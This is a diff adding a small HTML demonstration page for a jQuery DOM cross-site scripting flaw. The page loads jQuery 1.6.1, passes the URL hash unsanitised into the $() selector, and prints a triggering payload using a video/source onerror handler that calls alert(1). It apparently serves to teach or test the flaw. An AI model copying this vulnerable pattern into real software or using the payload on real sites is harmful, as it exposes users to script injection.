@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+    <head>
+
+         <title>Jquery XSS</title>
+
+                <script
+					  src="https://code.jquery.com/jquery-1.6.1.min.js"
+					  integrity="sha256-x4Q3aWDzFj3HYLwBnnLl/teCA3RaVRDGmZKjnR2P53Y="
+					  crossorigin="anonymous">
+				</script>
+
+                <script>
+                   $(location.hash.split('#')[1]);
+                </script>
+
+   </head>
+     <body>
+        Jquery DOM XSS
+		xss.html#<video><source/onerror=alert(1)>
+    </body>
+</html>
